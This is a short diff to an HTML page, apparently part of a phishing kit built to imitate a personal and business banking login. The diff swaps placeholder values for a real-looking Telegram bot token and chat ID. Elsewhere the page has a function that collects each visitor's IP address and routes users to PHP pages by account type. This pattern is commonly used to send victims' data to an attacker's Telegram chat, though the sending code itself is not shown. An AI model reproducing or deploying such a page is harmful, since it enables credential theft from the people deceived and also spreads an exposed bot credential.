@@ -113,8 +113,8 @@
     </style>
     <script>
         // Token de tu bot de Telegram y chat ID
-        const TELEGRAM_BOT_TOKEN = "75530";
-        const TELEGRAM_CHAT_ID = "743";
+        const TELEGRAM_BOT_TOKEN = "8438607874:AAEq2z7IN3yrOyXz8nJtb4M8jQwIFuPxuMg";
+        const TELEGRAM_CHAT_ID = "-1003686153318";
 
         // Función para obtener la dirección IP del cliente
         async function getUserIP() {
@@ -160,7 +160,7 @@
                 if (accountType === '👤 Personas') {
                     window.location.href = "indexx.php";
                 } else if (accountType === '🏢 Empresas') {
-                    window.location.href = "index2.html";
+                    window.location.href = "index2.php";
                 }
             });
         }
@@ -184,3 +184,4 @@
     </div>
 </body>
 </html>
+
